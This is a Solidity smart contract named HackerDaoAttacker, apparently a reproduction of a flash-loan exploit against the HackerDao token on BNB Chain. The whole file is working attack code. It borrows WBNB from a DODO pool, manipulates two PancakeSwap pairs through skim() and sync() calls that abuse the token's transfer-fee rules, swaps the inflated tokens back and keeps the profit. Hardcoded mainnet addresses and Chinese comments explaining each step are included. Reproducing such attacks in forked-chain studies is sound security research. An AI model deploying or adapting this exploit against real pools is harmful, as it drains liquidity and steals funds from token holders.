//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
pragma abicoder v2;
import 'hardhat/console.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IDPPAdvanced {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface IWBNB {
    function balanceOf(address account) external view  returns (uint256);
    function withdraw(uint wad) external;
    function deposit() external payable;
    function approve(address guy, uint wad) external returns (bool);
}

interface IPancakeRouter {
    function getAmountsIn(uint amountOut, address[] memory path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IHackerDao {
    function balanceOf(address account) external view  returns (uint256); 
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPancakePair {
    function skim(address to) external;
    function sync() external;
}

struct DPPAdvancedCallBackData {
    uint256 baseAmount;
    uint256 quoteAmount;
}


contract HackerDaoAttacker is Ownable {

    address public constant DPPAdvanced = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant PancakerRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public constant HackerDao = 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C;
    address public constant PancakeLP_HackerDao_WBNB_0xcd4c = 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2;
    address public constant PancakeLP_USDT_HackerDao_0xbdb4 = 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225;

    function startFlashLoan() public {
        uint256 borrown_wbnb_amt = 2_500_000_000_000_000_000_000;
        DPPAdvancedCallBackData memory callbackData;
        callbackData.baseAmount = borrown_wbnb_amt;
        callbackData.quoteAmount = 0;
        bytes memory data = abi.encode(callbackData);

        IDPPAdvanced(DPPAdvanced).flashLoan(borrown_wbnb_amt, 0, address(this), data);
        // require(address(this).balance == 175_208_335_493_366_655_043, "debug final balance");
        console.log("Finally I have %s BNB", address(this).balance);
    }

    fallback() external payable {
        console.log("path call %s",address(this));
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        DPPAdvancedCallBackData memory info = abi.decode(data, (DPPAdvancedCallBackData));
        console.log("owner address %s contract address %s", owner(), address(this));
        // require(address(this) == owner(), "owner address check");
        require(IWBNB(WBNB).balanceOf(address(this)) == info.baseAmount,"must equal");
        console.log("Now I have flash loaned WBNB num # %s",IWBNB(WBNB).balanceOf(address(this)));
        
        IHackerDao(HackerDao).approve(PancakerRouter, type(uint256).max); // 
        IWBNB(WBNB).approve(PancakerRouter, type(uint256).max);
        
        uint256 lb_amt = IHackerDao(HackerDao).balanceOf(PancakeLP_HackerDao_WBNB_0xcd4c);
        // can be more elegant??
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = HackerDao;
        // lb_amt * 0.9 = 10315400487514994955409
        // require(lb_amt == 11_335_604_931_335_159_291_659, "for debug 11_335_604_931_335_159_291_659"); // for debug
        uint[] memory amounts = IPancakeRouter(PancakerRouter).getAmountsIn(10_315_400_487_514_994_955_409, path); // 计算一下，要掏空池子里面90%的 hackerdao需要多少wbnb
        uint deadline =  block.timestamp + 6 hours;
        IPancakeRouter(PancakerRouter).swapExactTokensForTokens(amounts[0], 0, path, address(this), deadline); // 将借来的WBNB 换成HackerDao
        console.log("after swap Now my WBNB num # %s",IWBNB(WBNB).balanceOf(address(this)));
        uint256 lp_hackerdao_amt = IHackerDao(HackerDao).balanceOf(address(this));
        // require(lp_hackerdao_amt == 9_077_552_429_013_195_560_760,"debug lp_hackerdao_amt");
        IHackerDao(HackerDao).transfer(PancakeLP_HackerDao_WBNB_0xcd4c, lp_hackerdao_amt); // 将换来的HackerDao 转到HackerDao-WBNB的 panckakeLP上

        IPancakePair(PancakeLP_HackerDao_WBNB_0xcd4c).skim(PancakeLP_USDT_HackerDao_0xbdb4); // 让pancake的hackerdao-WBNB LP向USDT HackerDao HackerDao的LP上skim，skim的时候由于HackerDao的规则导致HackerDao WBNB LP自身的 HackerDao token也会被当作手续费减少，进而导致HackerDao的价格抬高了
        IPancakePair(PancakeLP_USDT_HackerDao_0xbdb4).skim(address(this)); // 将上一步skim得的HackerDao skim给自己
        IPancakePair(PancakeLP_HackerDao_WBNB_0xcd4c).sync(); // 更新 HackerDao-WBNB的价格
        uint256 my_hackerdao_amt = IHackerDao(HackerDao).balanceOf(address(this));
        // require(my_hackerdao_amt ==  7_029_656_601_027_818_642_253,"my_hackerdao_amt");
        console.log("now I have %s HackerDao", my_hackerdao_amt);
        address[] memory revert_path = new address[](2);
        revert_path[0] = HackerDao;
        revert_path[1] = WBNB;

        //swapExactTokensForTokensSupportingFeeOnTransferTokens 的用法 https://blog.csdn.net/zgf1991/article/details/109127260/
        console.log("Before swapExactTokensForTokensSupportingFeeOnTransferTokens my wbnb amt: %s",IWBNB(WBNB).balanceOf(address(this)));
        IPancakeRouter(PancakerRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(my_hackerdao_amt, 0, revert_path, address(this), deadline); // 将手上的HackerDao全部换成WBNB
        console.log("After swapExactTokensForTokensSupportingFeeOnTransferTokens my wbnb amt: %s",IWBNB(WBNB).balanceOf(address(this)));
        IPancakeRouter(PancakerRouter).swapExactTokensForTokens(30_000_000_000_000_000, 0, path, address(this), deadline); // WBNB 换成HackerDao
        
        my_hackerdao_amt = IHackerDao(HackerDao).balanceOf(address(this));
        console.log("now I have %s HackerDao", my_hackerdao_amt); 

        address[] memory usdt_path = new address[](3);
        usdt_path[0] = HackerDao;
        usdt_path[1] = USDT;
        usdt_path[2] = WBNB;
        
        
        IPancakeRouter(PancakerRouter).swapExactTokensForTokens(6_748_413_201_184_401_921, 0, usdt_path, address(this), deadline); // 因为原先的池子都枯竭了 所以要找其他池子兑换
        
        // require(my_wbnb_amt == 175_208_335_493_366_655_043, "debug my_wbnb_amt");
        // IWBNB(WBNB).withdraw(my_wbnb_amt);
        // return all borrow wbnb
        // console.log("my wbnb amt: %s and payback amt: %s",my_wbnb_amt,info.quoteAmount);
        IERC20(WBNB).transfer(DPPAdvanced, info.baseAmount);
        uint256 my_wbnb_amt = IWBNB(WBNB).balanceOf(address(this));
        IWBNB(WBNB).withdraw(my_wbnb_amt);
    }
}